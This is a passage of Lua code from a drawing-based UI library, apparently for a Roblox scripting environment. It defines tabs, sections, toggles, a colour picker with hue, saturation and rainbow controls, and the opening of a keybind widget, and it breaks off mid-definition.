                Size = Vector2.new(TabInline.Size.X - 2, TabInline.Size.Y - 2),
                Position = Vector2.new(TabInline.Position.X + 1, TabInline.Position.Y + 1),
                Thickness = 0,
                Color = Library.Theme.DarkContrast, --Library.Theme.Outline,
                Visible = true,
                Filled = true
            })
            --
            local TabTitle = Utility.AddDrawing(""Text"", {
                Text = Title,
                Center = true,
                Outline = false,
                Font = Library.Theme.Font,
                Size = Library.Theme.TextSize,
                Color = Library.Theme.Text,
                Visible = true,
                ZIndex = 2
            })
            --
            Utility.AddConnection(Library.Communication.Event, function(Type, Color)
                if Type == ""DarkContrast"" and Window.SelectedTab == Tab then
                    TabOutline.Color = Color
                elseif Type == ""LightContrast"" and Window.SelectedTab ~= Tab then
                    TabOutline.Color = Color
                elseif Type == ""Text"" then
                    TabTitle.Color = Color
                elseif Type == ""Inline"" then
                    TabInline.Color = Color
                end
            end)
            --
            function Tab:Install()
                TabInline.Size = Vector2.new(TabTitle.TextBounds.X + 50, 20)
                TabInline.Position = Vector2.new((Window.LastTab ~= nil and Window.LastTab.Position.X + Window.LastTab.Size.X + 5 or SecondBorderInline.Position.X), SecondBorderOutline.Position.Y - 20)

                TabOutline.Size = Vector2.new(TabInline.Size.X - 2, TabInline.Size.Y - 2)
                TabOutline.Position = Vector2.new(TabInline.Position.X + 1, TabInline.Position.Y + 1)

                if Window.LastTab == nil then
                    TabLine.Size = Vector2.new(TabOutline.Size.X, 1)
                    TabLine.Position = Vector2.new(TabOutline.Position.X + 1, TabOutline.Position.Y)

                    DisableLine.Size = Vector2.new(TabOutline.Size.X, 1)
                    DisableLine.Position = Vector2.new(TabOutline.Position.X, TabOutline.Position.Y + TabOutline.Size.Y)

                    Window.SelectedTab = Tab.CurrentTab
                end

                TabTitle.Position = Vector2.new(TabOutline.Position.X + (TabOutline.Size.X / 2), TabOutline.Position.Y + (TabOutline.Size.Y / 2) - 7)
            end
            --
            function Tab:RemoveDrawing(Instance)
                local SpecificDrawing = 0
                for Index, Value in pairs(Tab[""Render""]) do 
                    if Value == Instance then
                        SpecificDrawing = Index
                    end
                end
                table.remove(Tab[""Render""], table.find(Tab[""Render""], Tab[""Render""][SpecificDrawing]))
                --
                local SpecificDrawing2 = 0
                for Index, Value in pairs(Library.Drawings) do 
                    if Value[1] == Instance then
                        if Value[1] then
                            Value[1]:Remove()
                        end
                        if Value[2] then
                            Value[2] = nil
                        end
                        SpecificDrawing2 = Index
                    end
                end
                table.remove(Library.Drawings, table.find(Library.Drawings, Library.Drawings[SpecificDrawing2]))
            end
            --
            function Tab:Section(Title, Side)
                local Section = {
                    ContentAxis = 0
                }
                --
                local AxisX = Side == ""Left"" and SecondBorderOutline.Position.X + 6 or SecondBorderOutline.Position.X + ((SecondBorderOutline.Size.X / 2) - 10) + 12
                local SectionInline = Utility.AddDrawing(""Square"", {
                    Position = Vector2.new(AxisX, (Tab.SectionAxis[Side == ""Left"" and 1 or 2] == 0 and TabOutline.Position.Y + TabOutline.Size.Y + 6 or 6 + Tab.SectionAxis[Side == ""Left"" and 1 or 2])),
                    Size = Vector2.new((SecondBorderOutline.Size.X / 2) - 8, 24),
                    Thickness = 0,
                    Color = Library.Theme.Inline,
                    Visible = true,
                    Filled = true
                })
                --
                local SectionOutline = Utility.AddDrawing(""Square"", {
                    Size = Vector2.new(SectionInline.Size.X - 2, SectionInline.Size.Y - 2),
                    Position = Vector2.new(SectionInline.Position.X + 1, SectionInline.Position.Y + 1),
                    Thickness = 0,
                    Color = Library.Theme.DarkContrast, --Library.Theme.Outline,
                    Visible = true,
                    Filled = true
                })
                --
                local SectionTopline = Utility.AddDrawing(""Square"", {
                    Size = Vector2.new(SectionOutline.Size.X, 1),
                    Position = Vector2.new(SectionOutline.Position.X, SectionOutline.Position.Y),
                    Thickness = 0,
                    Color = Library.Theme.Accent[1],
                    Visible = true,
                    Filled = true
                })
                --
                local SectionTitle = Utility.AddDrawing(""Text"", {
                    Text = Title,
                    Position = Vector2.new(SectionOutline.Position.X + 4, SectionOutline.Position.Y + 4),
                    Center = false,
                    Outline = false,
                    Font = Library.Theme.Font,
                    Size = Library.Theme.TextSize,
                    Color = Library.Theme.Text,
                    Visible = true,
                    ZIndex = 2
                })
                --
                Utility.AddConnection(Library.Communication.Event, function(Type, Color)
                    if Type == ""Accent"" then
                        SectionTopline.Color = Color
                    elseif Type == ""DarkContrast"" then
                        SectionOutline.Color = Color
                    elseif Type == ""Text"" then
                        SectionTitle.Color = Color
                    elseif Type == ""Inline"" then
                        SectionInline.Color = Color
                    end
                end)
                --
                function Section:UpdateSizeY(SizeY)
                    SectionInline.Size = Vector2.new(SectionInline.Size.X, SizeY + 10)

                    SectionOutline.Size = Vector2.new(SectionInline.Size.X - 2, SectionInline.Size.Y - 2)
                    SectionOutline.Position = Vector2.new(SectionInline.Position.X + 1, SectionInline.Position.Y + 1)
                end
                --
                Tab.SectionAxis = {
                    Side == ""Left"" and SectionInline.Position.Y + SectionInline.Size.Y or Tab.SectionAxis[1], 
                    Side == ""Right"" and SectionInline.Position.Y + SectionInline.Size.Y or Tab.SectionAxis[2]
                }
                --
                Tab[""Render""][#Tab[""Render""] + 1] = SectionInline
                Tab[""Render""][#Tab[""Render""] + 1] = SectionOutline
                Tab[""Render""][#Tab[""Render""] + 1] = SectionTopline
                Tab[""Render""][#Tab[""Render""] + 1] = SectionTitle
                --
                function Section:Toggle(Options)
                    local Toggle = {
                        Axis = Section.ContentAxis,
                        Toggled = Options.State,
                        Drop = false,
                        Callback = typeof(Options.Callback) == ""function"" and Options.Callback or function() end
                    }
                    --
                    Options.Flag = Options.Flag or ""AWGWJIjgAWJIGIJAWG""
                    Library.Flags[Options.Flag] = false
                    --
                    local ToggleInline = Utility.AddDrawing(""Square"", {
                        Position = Vector2.new(SectionInline.Position.X + 8, SectionInline.Position.Y + 23 + Toggle.Axis),
                        Size = Vector2.new(13, 13),
                        Thickness = 0,
                        Color = Library.Theme.Inline,
                        Visible = true,
                        Filled = true
                    })
                    --
                    local ToggleOutline = Utility.AddDrawing(""Square"", {
                        Size = Vector2.new(ToggleInline.Size.X - 2, ToggleInline.Size.Y - 2),
                        Position = Vector2.new(ToggleInline.Position.X + 1, ToggleInline.Position.Y + 1),
                        Thickness = 0,
                        Color = Library.Theme.LightContrast, --Library.Theme.Outline,
                        Visible = true,
                        Filled = true
                    })
                    --
                    local ToggleHitbox = Utility.AddDrawing(""Square"", {
                        Size = Vector2.new(SectionOutline.Size.X - 60, ToggleInline.Size.Y - 2),
                        Position = Vector2.new(ToggleInline.Position.X + 1, ToggleInline.Position.Y + 1),
                        Thickness = 0,
                        Color = Library.Theme.Hitbox, --Library.Theme.Outline,
                        Transparency = 0,
                        Visible = true,
                        Filled = true
                    })
                    --
                    local ToggleGradient = Utility.AddDrawing(""Image"", {
                        Size = Vector2.new(ToggleInline.Size.X - 2, ToggleInline.Size.Y - 2),
                        Position = Vector2.new(ToggleInline.Position.X + 1, ToggleInline.Position.Y + 1),
                        Data = Library.Theme.Gradient,
                        Transparency = 0.5,
                        Visible = true
                    })
                    --
                    local ToggleTitle = Utility.AddDrawing(""Text"", {
                        Text = Options.Title,
                        Position = Vector2.new(ToggleInline.Position.X + ToggleInline.Size.X + 8, ToggleInline.Position.Y),
                        Center = false,
                        Outline = false,
                        Font = Library.Theme.Font,
                        Size = Library.Theme.TextSize,
                        Color = Options.Type ~= nil and Options.Type == ""Dangerous"" and Library.Theme.Accent[1] or Library.Theme.Text,
                        Visible = true,
                        ZIndex = 2
                    })
                    --
                    function Toggle:Set(State)
                        Toggle.Toggled = State
                        ToggleOutline.Color = Toggle.Toggled and Library.Theme.Accent[1] or Library.Theme.DarkContrast
                        Library.Flags[Options.Flag] = Toggle.Toggled
                        Toggle.Callback(Toggle.Toggled)
                    end
                    --
                    Utility.AddConnection(UserInput.InputBegan, function(Input, Useless)
                        
                        for Index, Value in pairs(Tab.Dropdowns[Side]) do
                            if Value then
                                return
                            end
                        end
                        if Input.UserInputType == Enum.UserInputType.MouseButton1 and Utility.OnMouse(ToggleHitbox) then
                            Toggle.Toggled = not Toggle.Toggled
                            Toggle:Set(Toggle.Toggled)
                        end
                    end)
                    --
                    Utility.AddConnection(UserInput.InputChanged, function(Input, Useless)
                        if Input.UserInputType == Enum.UserInputType.MouseMovement then
                            if Utility.OnMouse(ToggleHitbox) then
                                ToggleInline.Color = Library.Theme.Accent[1]
                            else
                                ToggleInline.Color = Library.Theme.Inline
                            end
                        end
                    end)
                    --
                    Utility.AddConnection(Library.Communication.Event, function(Type, Color)
                        if Type == ""Accent"" and Toggle.Toggled then
                            ToggleOutline.Color = Color
                            if Options.Type == ""Dangerous"" then
                                ToggleTitle.Color = Color
                            end
                        elseif Type == ""LightContrast"" and not Toggle.Toggled then
                            ToggleOutline.Color = Color
                        elseif Type == ""Text"" then
                            ToggleTitle.Color = Color
                        elseif Type == ""Inline"" then
                            ToggleInline.Color = Color
                        end
                    end)
                    --
                    Section.ContentAxis = Section.ContentAxis + ToggleOutline.Size.Y + 8
                    Tab.SectionAxis = {
                        Side == ""Left"" and Tab.SectionAxis[1] + ToggleOutline.Size.Y + 8 or Tab.SectionAxis[1], 
                        Side == ""Right"" and Tab.SectionAxis[2] + ToggleOutline.Size.Y + 8 or Tab.SectionAxis[2]
                    }
                    --
                    self:UpdateSizeY(Section.ContentAxis + ToggleOutline.Size.Y)
                    --
                    Tab[""Render""][#Tab[""Render""] + 1] = ToggleInline
                    Tab[""Render""][#Tab[""Render""] + 1] = ToggleOutline
                    Tab[""Render""][#Tab[""Render""] + 1] = ToggleTitle
                    Tab[""Render""][#Tab[""Render""] + 1] = ToggleGradient
                    Tab[""Render""][#Tab[""Render""] + 1] = ToggleHitbox
                    --
                    function Toggle:Colorpicker(Options)
                        local Colorpicker = {
                            Axis = Section.ContentAxis,
                            Color = Options.Color,
                            HexColor = Options.Color:ToHex(),
                            Dropped = false,
                            Offsets = {
                                X = 0,
                                Y = 0
                            },
                            Colors = {
                                HSV = {1, 1, 1}
                            },
                            SaturationDragging = false,
                            HueDragging = false,
                            Decimals = 50,
                            Rainbow = false,
                            Flag = Options.Flag,
                            Callback = typeof(Options.Callback) == ""function"" and Options.Callback or function() end
                        }
                        --
                        Colorpicker.Flag = Colorpicker.Flag or ""AWIJGHUIWGHuAW""
                        Library.Flags[Colorpicker.Flag] = Colorpicker.HexColor
                        --
                        local H, S, V = Colorpicker.Color:ToHSV()
                        Colorpicker.Colors.HSV[1] = H
                        Colorpicker.Colors.HSV[2] = S
                        Colorpicker.Colors.HSV[3] = V
                        --
                        local ColorpickerInline = Utility.AddDrawing(""Square"", {
                            Position = Vector2.new((SectionInline.Position.X + SectionInline.Size.X) - 38, ToggleInline.Position.Y + 1),
                            Size = Vector2.new(30, 12),
                            Thickness = 0,
                            Color = Library.Theme.Inline,
                            Visible = true,
                            Filled = true
                        })
                        --
                        local ColorpickerOutline = Utility.AddDrawing(""Square"", {
                            Size = Vector2.new(ColorpickerInline.Size.X - 2, ColorpickerInline.Size.Y - 2),
                            Position = Vector2.new(ColorpickerInline.Position.X + 1, ColorpickerInline.Position.Y + 1),
                            Thickness = 0,
                            Color = Library.Theme.LightContrast, --Library.Theme.Outline,
                            Visible = true,
                            Filled = true
                        })
                        --
                        local ColorpickerBase = Utility.AddDrawing(""Square"", {
                            Size = Vector2.new(ColorpickerInline.Size.X - 2, ColorpickerInline.Size.Y - 2),
                            Position = Vector2.new(ColorpickerInline.Position.X + 1, ColorpickerInline.Position.Y + 1),
                            Thickness = 0,
                            Color = Colorpicker.Color, --Library.Theme.Outline,
                            Visible = true,
                            Filled = true
                        })
                        --
                        local ColorpickerGradient = Utility.AddDrawing(""Image"", {
                            Size = Vector2.new(ColorpickerInline.Size.X - 2, ColorpickerInline.Size.Y - 2),
                            Position = Vector2.new(ColorpickerInline.Position.X + 1, ColorpickerInline.Position.Y + 1),
                            Data = Library.Theme.Gradient,
                            Transparency = 0.5,
                            Visible = true
                        })
                        --
                        local InternalInline = Utility.AddDrawing(""Square"", {
                            Position = Vector2.new((ColorpickerInline.Position.X - 225) + ColorpickerInline.Size.X, ToggleInline.Position.Y + 18),
                            Size = Vector2.new(225, 250),
                            Thickness = 0,
                            Color = Library.Theme.Inline,
                            Visible = true,
                            Filled = true,
                            ZIndex = 3
                        })
                        --
                        local InternalOutline = Utility.AddDrawing(""Square"", {
                            Size = Vector2.new(InternalInline.Size.X - 2, InternalInline.Size.Y - 2),
                            Position = Vector2.new(InternalInline.Position.X + 1, InternalInline.Position.Y + 1),
                            Thickness = 0,
                            Color = Library.Theme.LightContrast, --Library.Theme.Outline,
                            Visible = true,
                            Filled = true,
                            ZIndex = 3
                        })
                        --
                        local InternalTopline = Utility.AddDrawing(""Square"", {
                            Size = Vector2.new(InternalOutline.Size.X, 1),
                            Position = Vector2.new(InternalOutline.Position.X, InternalOutline.Position.Y),
                            Thickness = 0,
                            Color = Library.Theme.Accent[1],
                            Visible = true,
                            Filled = true,
                            ZIndex = 3
                        })
                        --
                        Utility.AddConnection(Library.Communication.Event, function(Type, Color)
                            if Type == ""Accent"" then
                                InternalTopline.Color = Color
                            end
                        end)
                        --
                        local InternalTitle = Utility.AddDrawing(""Text"", {
                            Text = ToggleTitle.Text,
                            Position = Vector2.new(InternalOutline.Position.X + 8, InternalOutline.Position.Y + 6),
                            Center = false,
                            Outline = false,
                            Font = Library.Theme.Font,
                            Size = Library.Theme.TextSize,
                            Color = Library.Theme.Text,
                            Visible = true,
                            ZIndex = 3
                        })
                        --
                        local InternalBaseInline = Utility.AddDrawing(""Square"", {
                            Position = Vector2.new(InternalOutline.Position.X + 8, InternalOutline.Position.Y + 25),
                            Size = Vector2.new(192, 192),
                            Thickness = 0,
                            Color = Library.Theme.Inline,
                            Visible = true,
                            Filled = true,
                            ZIndex = 3
                        })
                        --
                        local InternalBase = Utility.AddDrawing(""Square"", {
                            Size = Vector2.new(192 - 4, 192 - 4),
                            Position = Vector2.new(InternalBaseInline.Position.X + 2, InternalBaseInline.Position.Y + 2),
                            Thickness = 0,
                            Color = Options.Color, --Library.Theme.Outline,
                            Visible = true,
                            Filled = true,
                            ZIndex = 3
                        })
                        --
                        local InternalSaturation = Utility.AddDrawing(""Image"", {
                            Size = Vector2.new(196 - 2, 196 - 2),
                            Position = Vector2.new(InternalOutline.Position.X + 8 + 1, InternalOutline.Position.Y + 25 + 1),
                            Data = Library.Theme.Saturation,
                            Transparency = 1,
                            Visible = true,
                            ZIndex = 3
                        })
                        --
                        local InternalHueInline = Utility.AddDrawing(""Square"", {
                            Position = Vector2.new(InternalOutline.Position.X + InternalBase.Size.X + 14, InternalOutline.Position.Y + 26),
                            Size = Vector2.new(16, 196),
                            Thickness = 0,
                            Color = Library.Theme.Inline,
                            Visible = true,
                            Filled = true,
                            ZIndex = 3
                        })
                        --
                        local InternalHue = Utility.AddDrawing(""Image"", {
                            Size = Vector2.new(InternalHueInline.Size.X - 2, InternalHueInline.Size.Y - 2),
                            Position = Vector2.new(InternalHueInline.Position.X + 1, InternalHueInline.Position.Y + 1),
                            Data = Library.Theme.Hue,
                            Transparency = 1,
                            Visible = true,
                            ZIndex = 3
                        })
                        --
                        local InternalOutlineHuePicker = Utility.AddDrawing(""Square"", {
                            Position = Vector2.new(InternalOutline.Position.X + InternalBase.Size.X + 12, InternalOutline.Position.Y + 26),
                            Size = Vector2.new(InternalHueInline.Size.X + 2, 6),
                            Thickness = 2,
                            Color = Library.Theme.Outline,
                            Visible = true,
                            Filled = false,
                            ZIndex = 3
                        })
                        --
                        local InternalHuePicker = Utility.AddDrawing(""Square"", {
                            Position = Vector2.new(InternalOutlineHuePicker.Position.X + 1, InternalOutlineHuePicker.Position.Y + 1),
                            Size = Vector2.new(InternalOutlineHuePicker.Size.X - 2, InternalOutlineHuePicker.Size.Y - 2),
                            Thickness = 2,
                            Color = Library.Theme.Text,
                            Visible = true,
                            Filled = false,
                            ZIndex = 3
                        })
                        --
                        local Cursor = Utility.AddDrawing(""Image"", {
                            Size = Vector2.new(6, 6),
                            Data = Library.Theme.SaturationCursor,
                            Transparency = 1,
                            Visible = true,
                            ZIndex = 6
                        })
                        --
                        local InternalInlineHex = Utility.AddDrawing(""Square"", {
                            Size = Vector2.new(80 - 2, 18 - 2),
                            Position = Vector2.new(InternalOutline.Position.X + 8 + 1, InternalOutline.Position.Y + InternalSaturation.Size.Y + 30 + 1),
                            Thickness = 0,
                            Color = Library.Theme.Inline,
                            Visible = true,
                            Filled = true,
                            ZIndex = 3
                        })
                        --
                        local InternalOutlineHex = Utility.AddDrawing(""Square"", {
                            Size = Vector2.new(InternalInlineHex.Size.X - 2, InternalInlineHex.Size.Y - 2),
                            Position = Vector2.new(InternalInlineHex.Position.X + 1, InternalInlineHex.Position.Y + 1),
                            Thickness = 0,
                            Color = Library.Theme.LightContrast, --Library.Theme.Outline,
                            Visible = true,
                            Filled = true,
                            ZIndex = 3
                        })
                        --
                        local InternalHex = Utility.AddDrawing(""Text"", {
                            Text = (""#%s""):format(tostring(Colorpicker.HexColor)),
                            Position = Vector2.new(InternalOutlineHex.Position.X + (InternalOutlineHex.Size.X / 2), InternalOutlineHex.Position.Y),
                            Center = true,
                            Outline = false,
                            Font = Library.Theme.Font,
                            Size = Library.Theme.TextSize,
                            Color = Library.Theme.Text,
                            Visible = true,
                            ZIndex = 3
                        })
                        --
                        local InternalInlineRGB = Utility.AddDrawing(""Square"", {
                            Size = Vector2.new(130 - 2, 18 - 2),
                            Position = Vector2.new(InternalOutline.Position.X + 90 + 1, InternalOutline.Position.Y + InternalSaturation.Size.Y + 30 + 1),
                            Thickness = 0,
                            Color = Library.Theme.Inline,
                            Visible = true,
                            Filled = true,
                            ZIndex = 3
                        })
                        --
                        local InternalOutlineRGB = Utility.AddDrawing(""Square"", {
                            Size = Vector2.new(InternalInlineRGB.Size.X - 2, InternalInlineRGB.Size.Y - 2),
                            Position = Vector2.new(InternalInlineRGB.Position.X + 1, InternalInlineRGB.Position.Y + 1),
                            Thickness = 0,
                            Color = Library.Theme.LightContrast, --Library.Theme.Outline,
                            Visible = true,
                            Filled = true,
                            ZIndex = 3
                        })
                        --
                        local InternalRGB = Utility.AddDrawing(""Text"", {
                            Text = (""%s, %s, %s""):format(math.floor(Colorpicker.Color.R * 255), math.floor(Colorpicker.Color.G * 255), math.floor(Colorpicker.Color.B * 255)),
                            Position = Vector2.new(InternalOutlineRGB.Position.X + (InternalOutlineRGB.Size.X / 2), InternalOutlineRGB.Position.Y),
                            Center = true,
                            Outline = false,
                            Font = Library.Theme.Font,
                            Size = Library.Theme.TextSize,
                            Color = Library.Theme.Text,
                            Visible = true,
                            ZIndex = 3
                        })
                        --
                        local InternalInlineRainbow = Utility.AddDrawing(""Square"", {
                            Size = Vector2.new(100 - 2, 18 - 2),
                            Position = Vector2.new((InternalOutline.Position.X + InternalOutline.Size.X) - 100 - 2 + 1, InternalOutline.Position.Y + 4 + 1),
                            Thickness = 0,
                            Color = Library.Theme.Inline,
                            Visible = true,
                            Filled = true,
                            ZIndex = 3
                        })
                        --
                        local InternalOutlineRainbow = Utility.AddDrawing(""Square"", {
                            Size = Vector2.new(InternalInlineRainbow.Size.X - 2, InternalInlineRainbow.Size.Y - 2),
                            Position = Vector2.new(InternalInlineRainbow.Position.X + 1, InternalInlineRainbow.Position.Y + 1),
                            Thickness = 0,
                            Color = Library.Theme.LightContrast, --Library.Theme.Outline,
                            Visible = true,
                            Filled = true,
                            ZIndex = 3
                        })
                        --
                        local InternalRainbow = Utility.AddDrawing(""Text"", {
                            Text = ""Rainbow"",
                            Position = Vector2.new(InternalOutlineRainbow.Position.X + (InternalOutlineRainbow.Size.X / 2), InternalOutlineRainbow.Position.Y),
                            Center = true,
                            Outline = false,
                            Font = Library.Theme.Font,
                            Size = Library.Theme.TextSize,
                            Color = Library.Theme.Text,
                            Visible = true,
                            ZIndex = 3
                        })
                        --
                        function Colorpicker:Drop(State)
                            InternalInline.Visible = State
                            InternalOutline.Visible = State
                            InternalTitle.Visible = State
                            InternalBaseInline.Visible = State
                            InternalBase.Visible = State
                            InternalSaturation.Visible = State
                            InternalHueInline.Visible = State
                            InternalHue.Visible = State
                            InternalOutlineHex.Visible = State
                            InternalInlineHex.Visible = State
                            InternalHex.Visible = State
                            InternalInlineRGB.Visible = State
                            InternalOutlineRGB.Visible = State
                            InternalRGB.Visible = State
                            InternalInlineRainbow.Visible = State
                            InternalOutlineRainbow.Visible = State
                            InternalRainbow.Visible = State
                            InternalTopline.Visible = State
                            Cursor.Visible = State
                            InternalOutlineHuePicker.Visible = State
                            InternalHuePicker.Visible = State
                            Tab.Dropdowns[Side][ToggleTitle.Text] = State
                        end
                        --
                        Utility.AddConnection(Library.Communication.Event, function(Type, Color)
                            if Type == ""Accent"" then
                                
                            elseif Type == ""LightContrast"" then
                                
                            elseif Type == ""Text"" then
                                InternalTitle.Color = Color
                            elseif Type == ""Inline"" then
                                InternalInline.Color = Color
                                InternalBaseInline.Color = Color
                                InternalHueInline.Color = Color
                                InternalInlineHex.Color = Color
                            elseif Type == ""Outline"" then
                                InternalOutline.Color = Color
                                InternalOutlineHex.Color = Color
                                InternalInline.Color = Color
                            end
                        end)
                        --
                        Colorpicker.Offsets.X = InternalBase.Position.X
                        Colorpicker.Offsets.Y = InternalBase.Position.Y
                        --
                        function Colorpicker:SetHue(Options)
                            local Percent = Options.Percent or Options.Value
        
                            Colorpicker.Colors.HSV[1] = Options.Value

                            local HSVColor = Color3.fromHSV(Colorpicker.Colors.HSV[1], Colorpicker.Colors.HSV[2], Colorpicker.Colors.HSV[3])
                            
                            InternalOutlineHuePicker.Position = Vector2.new(InternalOutline.Position.X + InternalBase.Size.X + 12, InternalHue.Position.Y + (InternalHue.Size.Y * Percent) - 4)
                            InternalHuePicker.Position = Vector2.new(InternalOutlineHuePicker.Position.X + 1, InternalOutlineHuePicker.Position.Y + 1)

                            InternalBase.Color = Color3.fromHSV(Colorpicker.Colors.HSV[1], 1, 1)

                            InternalHex.Text = (""#%s""):format(tostring(HSVColor:ToHex()))
                            
                            local CalculateRGB = Color3.fromRGB(math.floor((HSVColor.R * 255)), math.floor((HSVColor.G * 255)), math.floor((HSVColor.B * 255)))
                            InternalRGB.Text = (""%s, %s, %s""):format(math.floor(CalculateRGB.R * 255), math.floor(CalculateRGB.G * 255), math.floor(CalculateRGB.B * 255))

                            ColorpickerBase.Color = HSVColor

                            if not Options.Visual then
                                Library.Flags[Colorpicker.Flag] = HSVColor
                                Colorpicker.Callback(HSVColor)
                            end
                        end
                        --
                        function Colorpicker:RefreshHue()
                            local PercentHue = math.clamp(((Mouse.Y + 36) - InternalHue.Position.Y) / (InternalHue.Size.Y), 0, 1)
                            local ValueHue = math.floor((0 + (1 - 0) * PercentHue) * Colorpicker.Decimals) / Colorpicker.Decimals
                            ValueHue = math.clamp(ValueHue, 0, 1)
                            self:SetHue({
                                Value = ValueHue, 
                                Percent = PercentHue
                            })
                        end
                        --
                        function Colorpicker:SetSaturationX(Options)
                            local PercentX = Options.Percent or Options.Value

                            local HSVColor = Color3.fromHSV(Colorpicker.Colors.HSV[1], Colorpicker.Colors.HSV[2], Colorpicker.Colors.HSV[3])
                            Colorpicker.Colors.HSV[2] = Options.Value

                            Cursor.Position = Vector2.new(InternalBase.Position.X + (InternalBase.Size.X * PercentX) - 4, Colorpicker.Offsets.Y)
                            Colorpicker.Offsets.X = Cursor.Position.X

                            InternalHex.Text = (""#%s""):format(tostring(HSVColor:ToHex()))

                            local CalculateRGB = Color3.fromRGB(math.floor((HSVColor.R * 255)), math.floor((HSVColor.G * 255)), math.floor((HSVColor.B * 255)))
                            InternalRGB.Text = (""%s, %s, %s""):format(math.floor(CalculateRGB.R * 255), math.floor(CalculateRGB.G * 255), math.floor(CalculateRGB.B * 255))

                            ColorpickerBase.Color = HSVColor

                            if not Options.Visual then
                                Library.Flags[Colorpicker.Flag] = HSVColor
                                Colorpicker.Callback(HSVColor)
                            end
                        end
                        --
                        function Colorpicker:SetSaturationY(Options)
                            local PercentY = Options.Percent or 1 - Options.Value

                            local HSVColor = Color3.fromHSV(Colorpicker.Colors.HSV[1], Colorpicker.Colors.HSV[2], Colorpicker.Colors.HSV[3])
                            Colorpicker.Colors.HSV[3] = Options.Value
        
                            Cursor.Position = Vector2.new(Colorpicker.Offsets.X, InternalBase.Position.Y + (InternalBase.Size.Y * PercentY) - 4)
                            Colorpicker.Offsets.Y = Cursor.Position.Y

                            InternalHex.Text = (""#%s""):format(tostring(HSVColor:ToHex()))

                            local CalculateRGB = Color3.fromRGB(math.floor((HSVColor.R * 255)), math.floor((HSVColor.G * 255)), math.floor((HSVColor.B * 255)))
                            InternalRGB.Text = (""%s, %s, %s""):format(math.floor(CalculateRGB.R * 255), math.floor(CalculateRGB.G * 255), math.floor(CalculateRGB.B * 255))

                            ColorpickerBase.Color = HSVColor

                            if not Options.Visual then
                                Library.Flags[Colorpicker.Flag] = HSVColor
                                Colorpicker.Callback(HSVColor)
                            end
                        end
                        --
                        function Colorpicker:RefreshSaturation()
                            local PercentX = math.clamp((Mouse.X - InternalSaturation.Position.X) / (InternalSaturation.Size.X), 0, 1)
                            local ValueX = math.floor((1 * PercentX) * Colorpicker.Decimals) / Colorpicker.Decimals
                            ValueX = math.clamp(ValueX, 0, 1)
                            self:SetSaturationX({
                                Value = ValueX, 
                                Percent = PercentX
                            })
                            --
                            local PercentY = math.clamp(((Mouse.Y + 36) - InternalSaturation.Position.Y) / (InternalSaturation.Size.Y), 0, 1)
                            local ValueY = 1 - math.floor((1 * PercentY) * Colorpicker.Decimals) / Colorpicker.Decimals
                            ValueY = math.clamp(ValueY, 0, 1)
                            self:SetSaturationY({
                                Value = ValueY, 
                                Percent = PercentY
                            })
                        end
                        --
                        Utility.AddConnection(UserInput.InputEnded, function(Input, Useless)
                            if Useless then
                                return
                            end
                            for Index, Value in pairs(Tab.Dropdowns[Side]) do
                                if Index ~= ToggleTitle.Text and Value then
                                    return
                                end
                            end
                            if Input.UserInputType == Enum.UserInputType.MouseButton1 then
                                Colorpicker.HueDragging = false
                                Colorpicker.SaturationDragging = false
                            end
                        end)
        
                        Utility.AddConnection(UserInput.InputChanged, function(Input, Useless)
                            if Useless then
                                return
                            end
                            if Input.UserInputType == Enum.UserInputType.MouseMovement then
                                for Index, Value in pairs(Tab.Dropdowns[Side]) do
                                    if Index ~= ToggleTitle.Text and Value then
                                        return
                                    end
                                end
                                if Colorpicker.HueDragging then
                                    Colorpicker:RefreshHue()
                                elseif Colorpicker.SaturationDragging then
                                    Colorpicker:RefreshSaturation()
                                end
                            end
                        end)
                        --
                        Utility.AddConnection(UserInput.InputBegan, function(Input, Useless)
                            if Useless then
                                return
                            end
                            if Input.UserInputType == Enum.UserInputType.MouseButton1 then
                                for Index, Value in pairs(Tab.Dropdowns[Side]) do
                                    if Index ~= ToggleTitle.Text and Value then
                                        return
                                    end
                                end
                                if Utility.OnMouse(ColorpickerInline) then
                                    Colorpicker.Dropped = not Colorpicker.Dropped
                                    Tab.Dropdowns[Side][ToggleTitle.Text] = Colorpicker.Dropped
                                    Colorpicker:Drop(Colorpicker.Dropped)
                                elseif Utility.OnMouse(InternalSaturation) then
                                    Colorpicker:RefreshSaturation()
                                    Colorpicker.SaturationDragging = true
                                elseif Utility.OnMouse(InternalHue) then
                                    Colorpicker:RefreshHue()
                                    Colorpicker.HueDragging = true
                                elseif Utility.OnMouse(InternalInlineRainbow) then
                                    Colorpicker.Rainbow = not Colorpicker.Rainbow
                                    InternalRainbow.Color = Colorpicker.Rainbow and Library.Theme.Accent[1] or Library.Theme.Text
                                    if not Colorpicker.Rainbow then
                                        Colorpicker:SetHue({Value = Colorpicker.Colors.HSV[1]})
                                        Colorpicker:SetSaturationX({Value = Colorpicker.Colors.HSV[2]})
                                        Colorpicker:SetSaturationY({Value = Colorpicker.Colors.HSV[3]})
                                    end
                                else
                                    Colorpicker.Dropped = false
                                    Tab.Dropdowns[Side][ToggleTitle.Text] = Colorpicker.Dropped
                                    Colorpicker:Drop(Colorpicker.Dropped)
                                end
                            end
                        end)
                        --
                        Utility.AddConnection(RunService.RenderStepped, function(Input, Useless)
                            if Colorpicker.Rainbow then
                                -- Colorpicker:SetHue({Value = tick() % 2 / 2, Visual = true})
                                -- Colorpicker:SetSaturationX({Value = 0.5, Visual = true})
                                -- Colorpicker:SetSaturationY({Value = 1, Visual = true})
                                Library.Flags[Colorpicker.Flag] = Color3.fromHSV(tick() % 2 / 2, 0.5, 1)
                                Colorpicker.Callback(Color3.fromHSV(tick() % 2 / 2, 0.5, 1))
                            end
                        end)
                        --
                        Colorpicker:SetHue({Value = Colorpicker.Colors.HSV[1]})
                        Colorpicker:SetSaturationX({Value = Colorpicker.Colors.HSV[2]})
                        Colorpicker:SetSaturationY({Value = Colorpicker.Colors.HSV[3]})
                        --
                        Tab[""Render""][#Tab[""Render""] + 1] = ColorpickerInline
                        Tab[""Render""][#Tab[""Render""] + 1] = ColorpickerOutline
                        Tab[""Render""][#Tab[""Render""] + 1] = ColorpickerBase
                        Tab[""Render""][#Tab[""Render""] + 1] = ColorpickerGradient
                        --
                        Colorpicker:Drop(false)
                        --
                        return Colorpicker
                    end
                    --
                    function Toggle:Keybind(Options)
                        local Keybind = {
                            Axis = Section.ContentAxis,
                            Title = Options.Title or ""LOL"",
                            EnumType = Options.Key.EnumType == Enum.KeyCode and ""KeyCode"" or ""UserInputType"",
                            Key = Options.Key or Enum.UserInputType.MouseButton2,
                            StateType = Options.StateType or ""Hold"",
                            State = false,
                            Shorten = """",
                            Binding = false,
                            Dropped = false,
